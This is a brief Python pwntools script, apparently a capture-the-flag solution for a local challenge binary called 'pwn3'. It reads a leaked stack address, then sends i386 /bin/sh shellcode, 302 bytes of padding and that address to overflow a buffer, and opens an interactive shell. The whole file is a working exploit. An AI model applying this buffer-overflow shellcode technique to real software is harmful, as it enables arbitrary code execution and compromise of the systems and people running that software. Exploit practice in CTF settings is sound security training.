#!/usr/bin/python3
import pwn
binary = "pwn3"
pwn.context.binary = binary
pwn.context.encoding = "latin"
pwn.context.log_level = "debug"

padding = 302
shellcode = pwn.asm(pwn.shellcraft.i386.linux.sh())

with pwn.process(binary) as io:
    io.recvuntil("journey ")
    address = pwn.p32( int( io.recvline().decode().strip("!\n"), 16 ) )
    payload = shellcode + b"A"*(padding - len(shellcode)) + address
    io.send(payload)
    io.interactive()